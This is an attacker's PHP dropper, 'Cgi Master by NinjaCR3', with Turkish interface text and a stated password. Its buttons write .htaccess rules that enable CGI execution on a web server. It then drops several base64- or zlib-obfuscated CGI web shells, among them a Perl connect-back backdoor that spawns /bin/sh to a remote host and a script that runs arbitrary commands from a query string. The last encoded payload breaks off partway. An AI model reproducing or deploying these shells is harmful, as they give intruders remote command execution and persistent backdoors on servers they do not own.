<?php
error_reporting(0);
echo '<html><form method="POST"><title>Cgi Master by NinjaCR3</title><center><h1>Cgi Master by NinjaCR3<br>SpyHackerz.Com</h1><h3>Tum CGI Shellerin Sifresi : r00t</h3><button type="submit" name="cgi1">Perl Izocin Cgi</button>&nbsp;<button type="submit" name="cgi2">Cgi Telnet</button>&nbsp;<button type="submit" name="cgi3">Cgi Telnet 2</button>&nbsp;<button type="submit" name="cgi4">Cgi Command Run</button>&nbsp;<button type="submit" name="cgi5">Alfa Python Cgi</button>&nbsp;<button type="submit" name="cgi6">Alfa Perl Cgi</button>&nbsp;<button type="submit" name="cgi7">Python Cgi</button></center></html>';
if(isset($_POST['cgi1'])){
	mkdir("izocin");
	chdir("izocin");
	$kokdosya = ".htaccess";
	$dosya_adi = "$kokdosya";
	$dosya = fopen($dosya_adi,'w');
	$metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

	AddType application/x-httpd-cgi .cin

	AddHandler cgi-script .cin
	AddHandler cgi-script .cin";
	fwrite($dosya,$metin);
	fclose($dosya);
	$cgishellizocin = '';
	$file = fopen("izo.cin" ,"w+");
	$write = fwrite ($file ,base64_decode($cgishellizocin));
	fclose($file);
	chmod("izo.cin",0755);
	$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
	MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
	ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
	MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
	ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
	MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
	Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
	KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
	SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
	ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
	UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
	VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
	ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
	JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
	bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
	ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
	YXRhY2hlZFxuXG4iOw==';
	$file = fopen("dc.pl" ,"w+");
	$write = fwrite ($file ,base64_decode($netcatshell));
	fclose($file);
	chmod("dc.pl",0755);
	echo '<center><p>Perl Izocin Cgi Olusturuldu! Asagidaki Baglantiya Tiklayabilirsiniz :)</p><a href=izocin/izo.cin target="_blank">Perl Izocin Cgi</a></center>';	
}
if(isset($_POST['cgi2'])){
	mkdir("cgitelnet");
	chdir("cgitelnet");
	$kokdosya = ".htaccess";
	$dosya_adi = "$kokdosya";
	$dosya = fopen($dosya_adi,'w');
	$metin = "Options +FollowSymLinks +Indexes\nDirectoryIndex default.html \n## START ##\nOptions +ExecCGI\nAddHandler cgi-script log cgi pl tg love h4 tgb x-zone \nAddType application/x-httpd-php .jpg\nRewriteEngine on\nRewriteRule (.*)\war$ .log\n## END ##";    
	fwrite($dosya,$metin);
	fclose($dosya);
	$pythonp = '';
	$file = fopen("cgi.log" ,"w+");
	$write = fwrite ($file ,base64_decode($pythonp));
	fclose($file);
	chmod("cgi.log",0755);
	echo '<center><p>Cgi Telnet Olusturuldu! Asagidaki Baglantiya Tiklayabilirsiniz :)</p><a href=cgitelnet/cgi.log target="_blank">Cgi Telnet</a></center>';
}
if(isset($_POST['cgi3'])){
	mkdir("cgitelnet2");
	chdir("cgitelnet2");
	$kokdosya = ".htaccess";
	$dosya_adi = "$kokdosya";
	$dosya = fopen($dosya_adi,'w');
	$metin = "Options +ExecCGI\nDirectoryIndex fuhosin.xx\nAddHandler cgi-script .xx";    
	fwrite($dosya,$metin);
	fclose($dosya);
	$pythonp = '';
	$file = fopen("fuhosin.xx" ,"w+");
	$write = fwrite ($file ,base64_decode($pythonp));
	fclose($file);
	chmod("fuhosin.xx",0755);
	echo '<center><p>Cgi Telnet 2 Olusturuldu! Asagidaki Baglantiya Tiklayabilirsiniz :)</p><a href=cgitelnet2/fuhosin.xx target="_blank">Cgi Telnet 2</a></center>';
}
if(isset($_POST['cgi4'])){
	mkdir("cgirun");
	chdir("cgirun");
	$kokdosya = ".htaccess";
	$dosya_adi = "$kokdosya";
	$dosya = fopen($dosya_adi,'w');
	$metin = "AddHandler cgi-script .pr";    
	fwrite($dosya,$metin);
	fclose($dosya);
	$pythonp = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbgojCiMgUGVybEtpdC0wLjEgLSBbRG9hciB1c2VyaWkgaW5yZWdpc3RyYXRpIHBvdCB2ZWRlYSBsaW5rdXJpbGUuIF0KIwojIGNtZC5wbDogUnVuIGNvbW1hbmRzIG9uIGEgd2Vic2VydmVyCgp1c2Ugc3RyaWN0OwoKbXkgKCRjbWQsICVGT1JNKTsKCiR8PTE7CgpwcmludCAiQ29udGVudC1UeXBlOiB0ZXh0L2h0bWxcclxuIjsKcHJpbnQgIlxyXG4iOwoKIyBHZXQgcGFyYW1ldGVycwoKJUZPUk0gPSBwYXJzZV9wYXJhbWV0ZXJzKCRFTlZ7J1FVRVJZX1NUUklORyd9KTsKCmlmKGRlZmluZWQgJEZPUk17J2NtZCd9KSB7CiAgJGNtZCA9ICRGT1JNeydjbWQnfTsKfQoKcHJpbnQgJzxIVE1MPgo8aW1nIHNyYz0iaHR0cHM6Ly9yZXNtaW0ubmV0L2YveWxkcmhNLnBuZz9ub2NhY2hlIiB3aWR0aD0iMzAwIiBoZWlnaHQ9IjgwIj48aDE+Q2dpIENvbW1hbmQgUnVuPGJyPk5pbmphQ1IzPC9oMT4KPGJvZHk+Cjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9IkdFVCI+CjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjbWQiIHNpemU9NDUgdmFsdWU9IicgLiAkY21kIC4gJyI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJSdW4iPgo8L2Zvcm0+CjxwcmU+JzsKCmlmKGRlZmluZWQgJEZPUk17J2NtZCd9KSB7CiAgcHJpbnQgIlJlc3VsdHMgb2YgJyRjbWQnIGV4ZWN1dGlvbjpcblxuIjsKICBwcmludCAiXG4iOwoKICBvcGVuKENNRCwgIigkY21kKSAyPiYxIHwiKSB8fCBwcmludCAiQ291bGQgbm90IGV4ZWN1dGUgY29tbWFuZCI7CgogIHdoaWxlKDxDTUQ+KSB7CiAgICBwcmludDsKICB9CgogIGNsb3NlKENNRCk7CiAgcHJpbnQgIlxuIjsKfQoKcHJpbnQgIjwvcHJlPiI7CgpzdWIgcGFyc2VfcGFyYW1ldGVycyAoJCkgewogIG15ICVyZXQ7CgogIG15ICRpbnB1dCA9IHNoaWZ0OwoKICBmb3JlYWNoIG15ICRwYWlyIChzcGxpdCgnJicsICRpbnB1dCkpIHsKICAgIG15ICgkdmFyLCAkdmFsdWUpID0gc3BsaXQoJz0nLCAkcGFpciwgMik7CiAgICAKICAgIGlmKCR2YXIpIHsKICAgICAgJHZhbHVlID1+IHMvXCsvIC9nIDsKICAgICAgJHZhbHVlID1+IHMvJSguLikvcGFjaygnYycsaGV4KCQxKSkvZWc7CgogICAgICAkcmV0eyR2YXJ9ID0gJHZhbHVlOwogICAgfQogIH0KCiAgcmV0dXJuICVyZXQ7Cn0=';
	$file = fopen("cgi.pr" ,"w+");
	$write = fwrite ($file ,base64_decode($pythonp));
	fclose($file);
	chmod("cgi.pr",0755);
	echo '<center><p>Cgi Command Run Olusturuldu! Asagidaki Baglantiya Tiklayabilirsiniz :)</p><a href=cgirun/cgi.pr target="_blank">Cgi Command Run</a></center>';
}
if(isset($_POST['cgi5'])){
	mkdir("alfacgi1");
	chdir("alfacgi1");
	$kokdosya = ".htaccess";
	$dosya_adi = "$kokdosya";
	$dosya = fopen($dosya_adi,'w');
	$metin = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";    
	fwrite($dosya,$metin);
	fclose($dosya);
	$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IHpsaWIsIGJhc2U2NApldmFsKGNvbXBpbGUoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoImVKeWxGOXR5MnpiMjJmb0tETHhiVXF1ckZUdk42TmE2WHFmMWJOTm1FcmN2dGtjREVxQ0lDUWx3UWRDMjZ2RisrNTREa0JMVmFPTzJhOC9ZQk03OWZtRE5adG81a25taGpTWHhXdHBvNXY4TmhXSlJKc0p1Unp6R29yQ0FWYkN5N05TbzVhYnNBMTVmbC8yMXNBanBSNndVcjAvN2xja3lHWFVTbzNOaVpTNUlRMkZOZ3VlR2d6VXNGaEdMUDNuVWo5Wkl0Yjc2dVVGdnpqV2pCcmtCRndDMUsxQ3RJeE9pUzlEMlhocXRoaWtyVjUvRUpxUWZMejVjdmI5ZS9YVCs3cEoyUWZreU5yS3dpb0ZDaXhiQnpSN2lYVWRrcGZnOU5xVWRMaExDc29SZDVEeU1rZDFSbk1xTXIwckxwZXFUN1VGWDFyTXZkQ0hVQkhEM1VZZHhwa3QwNnRHUkVXV1ZJWGFiZUdnRTQrRWVFZDYycVd4bEZQSEVuVVNiSERtczVmQ3RGQm4vYUxWaGE4U01jdzRBaEE4aFB2Y3NxMFFZeEVHM3c2WDVITUFCQUg0RUlqRE5rL293RGl2MTcwcGJFZnJnRHFQWHAxekVtb3NRc0xxT0NCZ0NrV2Y3RWhGZ2RWdVMvTWZOZVBycWppd1dKSWc1Q2RDM3lxdmd6cVNIRXVCdk1NTnZoT0IzOGNBRHdMeW9qQkhLL3ROSmJ3S0U1RjN3WkpGQjBvVEJyUXI2Z1RkUWFldTRNUVdjZDdTQkEwaEZNaDJ6ckF3eHdBYzVCeWoyQU9zNmEwRENDMXozMllJcUhZamR5anNQczRiWmRNaWlFditIZEVpN25mZVEvUVZtU1hCRDVuQ3ZvSTQybVZqUVdHZmFUSS9Icjc0K0dZOW5kQm4wNmpyRXNGYWxNR0czRjh4SFNMTDg5Z1hLdlhLNC9QRHI1WWU2SExZY0RzcWVSSWs0T1hNY2RtYnRTTzcrRnFEUFZ5c3NvOVhLUlhpMXlwbFVxeFdHMlpVd29SZGFXU0FkMkUwaHBzU0tSenRLYlo3ZG1sdEZHNlJnamxmTGVRclZzWnhiYVRPeHZJQ0U0aVRha1BNZjM1NlRhM0gramd6SXhmZFg1UDNHcGxyTlJ4NXRuZ3ZMb01hWUtZVmQwRit1M3c3ZTBPWGNXYkw4eHhOVVZ5YVZtQ3F0eE96NWVMVktVTnVxZUVveXpleVVHTGxPN1V6ZkN3TVhEMU9TU3M2Rm1ua1BrT1BKV1pLQUV4OGt0K21Vbkp5T2k4Y1pseVdreDJZS29VZldnd2ppLzJtR2hnMTJmQVFVU2xIS2N2YVFTaXNHNExFWXJGZjZ3YkJpOXB5eFNHUlBPVE5ycVFaT0JXQ092SUhlU3NpbUFjdmtXazFKRHVwa1loWnB3d1hvYzFJOGtsSm5ra09ENERQc2wydWpLOFduMkVBVkNNRWdBZmJqb0V3WlJ6M0c4SHNLVk1mankxZmowL09hMDhBd0xxdHlpcURHdU1rWkt2Qm56SWdyVTZLWENnMHhGT1ovT01ZYmkrTkJxL1ZUVzJlMG9RNURKaEs3OWJMenhMTlVSV1Z2TUdzV1pSWGwwdDQ5MVFJYmVXMWVMcjZIM1ZUSEVqcW5Xb3RERG5nK2hvYnk5SmU0TmI3N0dsVStFTThEMGdyR1lWQ3NCN1dUU3NzTVlKOTlEaEdvQ2Q0L1kxQWd0T3dKeG9MOFRkVDY3YVYyUy91VzhvM2dsaTV0ZTQ3ZnVwOUc4UFRrTmFEVnhYLzJKajQ3ZTFNYkNJM2s3N3NpWVpYVnMyZG9BNjdHNWlOZnRaSG1HNklWeEpNdktOZHhsVU11WXJPNnpBUitmcmU1NHVGdEFLNitoUmFiQUFLMHpCa2wwZHBKWE5EanNmdWh4T3JDdTNKQjRZU3AwVHI2VDZkVzY1d0tkTHE3UUdjQk0yOGFkSUpZWUxJczV3bjBJVktMZ2tEU0pUVGNhTmRsd0NPQ2xJeVRyeUI5NzJVcFlUa2kvM0hYOWVuYk5mUzJiQmpyZkQ2S29QM05SOGdTN0c4a1dGeW9pSGZ6Z3A1UVVtdUozcU1raGxyQytnRkhPejN4WER0K1FTZWdxRVVXL0lBLzJteHFPeEtvd3dYOVZSak9GS01FczhJekFjWDJMRDJlVEM0bmt6Y084bkZuQzdsWXkyMGpqWmExS1FSNnRSS3hCWTlZVFY2WUcwaGxPZjR4amU3TG9KbjVSSmJrSjhoRHQwbTVZVTlielo3TCsyYlUxRFdEUVo1T01FdWRwaGM2ejNHR1R3L05wYnIwWUN6MVVWU2ZOQlBKNndUTWwvTmkrVVVoZTVYYWlHMnFqQmo5VUlJM3dmTmxBVUdLVXhGL1d0QUVacnlndFlsQklqTVI0UERIVFF1dHRHN1JQanBDUUlLN1dyMkYzWGpVTzRUVkd3cUVRRUhaSzlnd3R0aDlrc25TdWhYaWlKQTJrNXZ0NGE3akJHamo0TkNQYzZkQUEzYTBLS09CRHZFRHg1MkhFT0NyV25zSWJtOElEVC9ENzI3eHF5eGI0UzJRdFRZYldOQkd1S3dscWtIRWJUamNZa05JSGlJbzhnY0RiUGZaMXd2d1RnTGNZZmFDQU1pTkVIUUR6OWdkcXk2Y1Y0Z3dPaGxQVHJkazlXNXhqVk12RVZET2hQWmd3b1FOdTI2UGtuOTlONlQ3K01GMUtweEVRb05lb25vQjFCWXJTVlZnMHdJZVpSWEhvaXhSK0dhSTY2ZC9HcEZMOTA5cWVBa0lZNXczUFVNNGRZN3E1WENiQVI2MFhTbnJKWGZmZmMydTJ6MHN4UFBCNTlpMlprWk5lallwUGlvT0ZPQThjcDBPWGcxYSthbTVvRGFWNEZWM0dNS0l4aWJGRjlaVVl0YUNwTDhEeVNUY2cwcStXTndHS2JUdUozZlBoKzVwQVhkQnIxNXhlOEZ0OE95QWNRMk1yR1pocFVRWnMwS0VRdUViNFpjUFYxRGRCZlFHQ0hjYnU5dnR6dlpZL3pGcXZxT21CSk1YS2hXbWdvRFdCblBvL2M4ZnJ5bGhNZnAxQVVIZnZmc2crTXU1MnpHSTJ6R28zL3dhSHB3U3J3WGRYMzV4R2ZZN2V5OGdlL1FZSDByQVR4VGkyckNKS2RtWDR2M1pnSnVUNzkrdnhsdWh5eVZkZnFYZ29UQnIvMzJSVStvVkFDdTBpak9KYlFzQ0dXdVZTSlBEOEQwM2dteDBCWWtPSDk5QU1PdG9BcEVMN3V3Wms1blVqMURYOFdaYm5YN1FPZlEvSEJVbXh6YTR5OHhEU2JnYnUzOG1HZitQMkFPU2Qwd09MMmNKcTdCMW1nNDRzK3dQSjRUZlZST2NuSFZYTVBpWXdCbUVqdDArSDlBUHpjUEpMYlo3MGJwSU5iem5DWE85QnZja2h6RWZPZTVOUHRTenFWbWEzZGJtdzdlVmpGRk1jZGg5YWFIYTZvUnJsWVQ1Ylg2NGZ2Zmp3am5JdGNPYjhkMFFNWUM3ZHhEZWJtdkZmZGY1ZDdZdGlmMzAzRSs0T2gyOGxuK3hpTDVBeEQ2WDRGTnV0Mmp0TW03a2RpNmMvTEI5NGlxS3o4amd2MTFOVlpvPSIpKSwnPHN0cmluZz4nLCdleGVjJykp';
	$file = fopen("py.alfa" ,"w+");
	$write = fwrite ($file ,base64_decode($pythonp));
	fclose($file);
	chmod("py.alfa",0755);
	echo '<center><p>Alfa Python Cgi Olusturuldu! Asagidaki Baglantiya Tiklayabilirsiniz :)</p><a href=alfacgi1/py.alfa target="_blank">Alfa Python Cgi</a></center>';
}
if(isset($_POST['cgi6'])){
	mkdir("alfacgi2");
	chdir("alfacgi2");
	$kokdosya = ".htaccess";
	$dosya_adi = "$kokdosya";
	$dosya = fopen($dosya_adi,'w');
	$metin = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";    
	fwrite($dosya,$metin);
	fclose($dosya);
	$pythonp = 'IyEvdXNyL2Jpbi9wZXJsICAgLUkvdXNyL2xvY2FsL2JhbmRtaW4KdXNlIE1JTUU6OkJhc2U2NDt1c2UgQ29tcHJlc3M6OlpsaWI7ZXZhbChDb21wcmVzczo6WmxpYjo6bWVtR3VuemlwKGRlY29kZV9iYXNlNjQoIkg0c0lBQUFBQUFBQS82VVpEWGZUUnZLdkxCdGhTUkJidGt0YXpySmNRdUpBM2lVaGx4anU5YUpnWkdsdDcwT1dWSDJRcE1iOTdUZXp1N0trRUtDMHlVT1JadWQ3Wm1kbWx5Smo1UFQ0ZER3WXZQUXk5dk16dXdEQUVRK1pCRVRlaWduUXdVMUFkRytXVFJNdlgrcTI1aS80Tk9BcGNRZzhFY3NvRncydGE1cTI5bDhlblUxZ3VXdHJaNU9EVlhESkV2aWlMV3ByYnlOK1cwRnNnQnpFcTVVWEJSTytZbkdSSHhhcGwvTTRndFVla0Y4dTQ1dkRPNURCL1RkRm5oUTV3bTBOdEJLQzRXdkI4akJlOEloOC9venZ5VTNCQTBNYm12aE52WER1b1loU29LRlUrNVZVaWcxSVRTbFRJSitEd1hWazZnY1U4R2h5RTFEQU9BZEw3L09qcml0UUxFUzRZT0FZNXVkeDJzUWgvVkdyUjNxalZsL2c0bHRQd0lBb0syYmtnbm5CdVplQ3k5ZGg3SHNoTVo3d3lBUWVMNmFFeitGcEs3REdkNGtHNy9EOHlPN2crY2tMUWU1cEVlWTg4ZEw4S0U1WGgxN3VBYWsyUG51MzFnL2VuRTNHWjVQcDVMZnpzYjRoenAvRVdwWElyalVIOUhZQStEYVp4VVVVZU9tZFkzU2VtcHBsODdraE9WeU0vL04yZkRtWm5vNG5yOThjQWcvMk82R3Z4aE5xcmpVZWJRVUIwc1Z2MDh2SnhmSFpLMzFqYjFpWWZadkYrWnRMNUpHQzZjYmw1UEQ0REt6aDBlNDl2VS9HWjY4bXIvV05hVysyN1A2dVRhRHdTd1VCdGZWMlcrOW9QZnRGeURQTXJpd0plVzVZV3hSTDZBUE9mUTBhc3ZSbEhDQ1ZodGhYdmVzbUdEUndVemZDZjUvaFQyU1Z5MGp4d2RaS1lyMTgvWk5rZ2tLekFKVkhhMzBPdXcrVlJudUlRS3BZQUhkY3hyeDNYSXEydUxRa2svaTkycGRnVFMxcmNSK1dJUXk4QTBuazlHMWxpY2F2NFpVL2ZRck9LUUVTLzMzbnFaQW9WS3d2QVhmRHZWRktRQllxQlNBVGxZbmlEVmtZNzQyR1cwenpzd0JvOEtXWlFzVXQ3bU9qMHpHdHhQTS9HdFNudTJUSmJnMnRaNXJXZ2dsRFVKS3dGU2pzRGFZWFc3OFErYWNDMXlvREJpWXl6MS9DQnpHNnBOTWgyZzZBTVZrcjQ5eW5GZ0h4Um0wWFZad2N5UW14ZDBuZlZFWitWOGtmTktVRFpkRHRVdHpmUnNEbVBHSlF2c3BWTEtaMVRHWDFCb3ZGMnlTTXZRREw5ZHBmeG9taFRid1VDdUFaQk1zVTNHb0FkTmhCa2FZc3lnOTVhcUorSyt2S2RWM3JHdmE0TmttOUtKdXpGSm1KdFVmRzFYdnJ2ZXRlUHpHMVIzYWRFU3FoNmgvdUdyV0VoSmY4RDVURG85eUFKRjFnTTJobXRFa3NxT245WnlZV2xUaGhrZkgyL09UTi91SFI4Y2w0bDlCUlRRdzF6ZldNUjZzNFlEVWtZWmFzcG5hU2dpQlNyWkY3d213L2pMTUdzU0tocGJFc0lQZTEvL2ZMamh0UmhhaFBsb3dnUTBMMXprejF3NGFYT3pvbE4xNUdDaEVKNEpjVnZzK3liRjZFNFYxSGw4bXBwQjU1cUJyMG1rZlVsdkU3eHdVVXJRSUo5WXFzTlN4YldKV0dQc1NLcGFPaEFNUVJVS3g0N3RCOHliT08vT2dFUFBObXdOWEowNExaWWlYb1FJWVV6Sm5sc1djVUVjdDhMMkVHaTN6dzVOdUxZK2kxU1J3Qlo2T09iVUthVVFKSStWM0NITG90b2xVTnBXVEY4bVVjT0xKY0U4L0hIdTJBWTdSTFArVkpmZ0o5Q1VIZ2t0RXc5R1lzSkVEc1VPV2FGS0JaNGtXRUE0dnBkSTZ1TEJJQVdnZ2RrV0dXcDNHMEdMV2lXWmJZOG5td2pDR0N4Qk14QUVTSk1iUUU5OUdRUnpnTlpQbGRDQ3FESjVMUXV4dEVZQnlZZ2xLMmtzRjUvdEtMRm9nVys4VUtyTzlBQk1jaHc5ZVhkOGVCNGVwYm5WemQ3UEFvWXVucnllbUpJN3lFOHJPcjduVkhERVNVU0M4aGxCSlJHdW1ja2d6eXg2RS83ZEZTTTdraUkxWFNsRjh5UmtyRkxZWEVXZklnWUZISk9kZ2lnNnVySFN6Yy9IVXE3MHNSSXBid1I2V1ZMaHI3Rkt3U1RUaGxlWkZHb2czakN4RnBhTmNUV0VHcXpEMzNGa3gycHJVMkZ2a1ZWUG8xNjQzOUVJSm9ERmZ2dmZZZisrMy9kZHYvdWpZdC9iSGVLU0paTUY4L29idFFMQzIyS1BmdFFReWFSM2tiRFI2UW5OM20xakpmaGRoUXRsdDJpSkRSY0FsNmpZWTV6ME0yT2tEQlpIWkg5aytPOXNtRTdaK1NOamw0ZFV6T1dSb09MWWswRkhrMGVyS0dDVFNFRWl3VGFiT3pUWXYxSFB5WUQwaktGOHZjamoreEZBQTNBK2wyMjQvRE9CM3M5UGZtODI3WHZ1RkJ2aHowbm5XVFc3dE1UQ2lMeUxjOWc2SHRvNDNLdDdkTUNBdERubVE4czIrV1BHZHQyQkkrV0JqRk42bVgyQnVSNytzVmxCMGV0WVg4QVpSUjRBMzBPWWR4c08yRmZCRU55QXFVQ1prOWkxTUlDdUFrdHlTTFF4NFFLSFgyREx5NlNIR21BZDloQllRTkR0NEU3TnQydHZRQzFLTUx2OCtBYXFjNy9xbjdiRjl4YXFkZXdJdHNnRXZLTnRMZlF3Vit4QXkvU0RQd0VVbGlqZ240RmNkSVk0bmM2K3U2em1pRGlrSEk1bm1wU0U5NFlpTzJ3cFhZQ25LUFhhK1Z3RkplblpjSTdzTnVrcEVrY1lvRjR5RUhiSGI4VmJEK1c5eEszLzJDS2o4UXp3ZWtKVjRROEdqUlZrN0tjcWpLQTdMMzVRcERUUkMrd2FCQWFEM1l5bGlUbEg2TnZLNXBYMU8rRkZ6VHBXN1B6cEg0S1FVUGVqOERta3I4dmVmKzN0N3pNdkc3M2NmVkR2R0tQTFkzV0w1eGd3MHR1VFZuT1AzR0VkYW1iMVZsY0RYVzR6a2daQWIycU5sQ1NIVG9UbGY4UUdHTkUrbEtoOElYcGtidFU3NEt0V3JmUzRaT0Z3QjBGakNUcGtHVnJKb3VWQk1sQ2dKSlIxZGtPS3RLQ1hpRWtjd0xTQXZTOXhQUE9IUmg4cWNBcTY4WGl4VTAvSTRmcjRiV2JFU3VzZjVHZVZWL2h6bDJiaUxkN05BZURCSlNTL1FlSlQ3c0pkdy80R2loSjM0cnh6dTBENHJteUNKb0VDbXQ1N0RySFBxT3BZRVhlV1ZmUWhKUW8ySFhUcjgvN3ZlZmk1WExTbk55c09DcU5zNUdTbTBDdFRlQzh5eFluOGNFbXo1TEljQTRCSFYwaVpjSCtNREcwbXdSUjNFTTlwWlRrTko3UkR1dEI4WWZZOXVIT3JUaUNBLzBGZnpGck1FVXdocFBhM0xVRGNJSkpQZ3hGZ0xrdGRiT1V4aDI4RVJYbmI5clBXbEV4QkVjNGlybUVqbEg2Q3FmdXovOUFpNjFkZEJ6ZTlXQUtvbGg1Y1gzS0dyT29kV0E4eVZOZnpabnZUMmdxYWxWNGwrN0dxRjJOUTJpTTJZL1BBM0tsZVc5SmVqOGpWV1lsaHhYWDhKT1d6ZG1TRmVIU0t1N25vN3U2aHV4NnYvUWhPbFhFK1kvblUrM285YVBqS0ovYTdJQ2dFd2VTTzQ2QTZ3V0pia3ZwMHlvVU52WnIvc1haekpmcHVzOTdISTJiTTZOaW1RMG9vM1pXRDYvUzcrVVNrWmlCZzY1LzlHaEVIdy9qdVljZHB1cjc2ZU0zTVVGbkZ2ZzVWZElBSlVCUUNRU1FrNkFSQTJGY3c4KzdLMU9yMk00cDFXREpXVG9QeG9xbTllQWErRDBTRzVjYysyRkhxamJOYXRKVUtBU2R1c3poaVY1NWQzeVZiRWlPUkNUR002SVg3bFR6QmpZSGhpWldaN0J4cmZNTDNKV01seHZXdHNyT1B0ZU9tMXZ1QzRQTG83UEo5T3ovZE14SEROcnU3M0NHRis4RzE5c01acW5hMUpleDlpYVROMFNoSWRXN2FLSVNtVWNFakRjRnRPWnVKeVZwMmtmcjhDMHhxRDlBRmFBV1BKU29JSDZRVjF1ZnNDVGRHTU40MFhGd2J5aEFsNFR2SGV6SjM3Z1prL3h4Z2t2ejJDd2dCT2l2Tzc1TG9GOW4wTEd2M2xGcWk1b096V292ZEhlaE1FRFI0bktQZFFQaUZ1djZTNkY2cXRZNGFLU1d3R1YrVjl4aldUOHdiUTNyWHNuSEx5L3dYdmZ2OVJSdGgzRGZWRlBqaHFtTE83M1d1SXc0Si9LQnFHR1E1eG1CbjBjeC9TUkdEK2s1WU9IdW9tYU1VVURxZ0t5YlVDeVNZT0kwVEQ1dHFqR1lGb0tMNGRLa3NZM21hUDN1enJKRXBoSi9DV0RvcUtMeWdDaVJUcW9yTWFNVXFkUGM5MnFMcXZLQlBpTGNhd2JVMCtQZW4zUUxvOWZyZlg5azR0VGNRM3F0cHJiMzViMTR5dEZRZDBvZi9FZkRjRDJzOU9yOGczdjZjaG5hb3VMS3dXVW1MdmJlbVBpMFNka3hyQ3hQZ0pXVTNYZ3hSdlExSTFNdkUxVkNhQk44UUM3QVduZFJuR3NNbEpvK0dVMTNHektGTExLK0pReHRwTGFTRWJ0MWxmSEpMdDFiMUt6L3c4d2JsUytGUm9BQUE9PSIpKSk7';
	$file = fopen("perl.alfa" ,"w+");
	$write = fwrite ($file ,base64_decode($pythonp));
	fclose($file);
	chmod("perl.alfa",0755);
	echo '<center><p>Alfa Python Perl Olusturuldu! Asagidaki Baglantiya Tiklayabilirsiniz :)</p><a href=alfacgi2/perl.alfa target="_blank">Alfa Perl Cgi</a></center>';
}
if(isset($_POST['cgi7'])){
	mkdir("pythoncgi");
	chdir("pythoncgi");
	$kokdosya = ".htaccess";
	$dosya_adi = "$kokdosya";
	$dosya = fopen($dosya_adi,'w');
	$metin = "AddHandler cgi-script .izo";    
	fwrite($dosya,$metin);
	fclose($dosya);
	$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
